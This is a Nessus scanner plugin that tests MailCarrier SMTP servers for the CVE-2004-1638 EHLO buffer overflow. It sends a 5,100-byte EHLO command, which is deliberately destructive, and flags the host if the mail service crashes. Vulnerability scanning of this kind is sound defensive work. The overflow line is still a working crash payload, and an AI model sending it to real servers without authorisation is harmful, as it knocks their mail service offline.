#
# This script was written by George A. Theall, <theall@tifaware.com>.
#
# See the Nessus Scripts License for details.
#

# Changes by Tenable:
# - Revised plugin title, output formatting (9/13/09)


include("compat.inc");

if (description) {
  script_id(15902);
  script_version("$Revision: 1.17 $");

  script_cve_id("CVE-2004-1638");
  script_bugtraq_id(11535);
  script_osvdb_id(11174);

  script_name(english:"MailCarrier < 3.0.1 SMTP EHLO Command Remote Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote SMTP server is affected by a remote command execution
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The target is running at least one instance of MailCarrier in which 
the SMTP service suffers from a buffer overflow vulnerability.  By 
sending an overly long EHLO command, a remote attacker can crash the 
SMTP service and execute arbitrary code on the target." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2004/Oct/283" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to MailCarrier 3.0.1 or greater." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"metasploit_name", value:'TABS MailCarrier v2.51 SMTP EHLO Overflow');
 script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2004/12/03");
 script_set_attribute(attribute:"vuln_publication_date", value: "2004/10/26");
 script_cvs_date("$Date: 2016/10/03 20:33:39 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

  script_summary(english:"Checks for SMTP Buffer Overflow Vulnerability in MailCarrier");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2004-2016 George A. Theall");
  script_family(english:"SMTP problems");
  script_dependencie("smtpserver_detect.nasl");
  script_require_ports("Services/smtp", 25);
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("smtp_func.inc");

host = get_host_name();
port = get_service(svc:"smtp", default: 25, exit_on_fail: 1);
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);

debug_print("searching for SMTP Buffer Overflow vulnerability in MailCarrier on ", host, ":", port, ".\n");

banner = get_smtp_banner(port:port);
debug_print("banner =>>", banner, "<<.\n");
if ("TABS Mail Server" >!< banner) exit(0);

soc = open_sock_tcp(port);
if (!soc) exit(1);

# It's MailCarrier and the port's open so try to overflow the buffer.
#
# nb: this just tries to overflow the buffer and crash the service
#     rather than try to run an exploit, like what muts published
#     as a PoC on 10/23/2004. I've verified that buffer sizes of
#     1032 (from the TABS LABS update alert) and 4095 (from 
#     smtp_overflows.nasl) don't crash the service in 2.5.1 while
#     one of 5100 does so that what I use here.
c = 'EHLO ' + crap(length:5100, data:"NESSUS") + '\r\n';
debug_print("C: ", c);
send(socket:soc, data:c);
repeat {
  s = recv_line(socket: soc, length:32768);
  debug_print("S: ", s);
}
until (s !~ '^[0-9][0-9][0-9]-');
if (!s) {
  close(soc);
  debug_print("trying to reopen socket.\n");
  if (service_is_dead(port: port, exit: 1) > 0)
    security_hole(port);
  exit(0);
}
smtp_close(socket: soc);

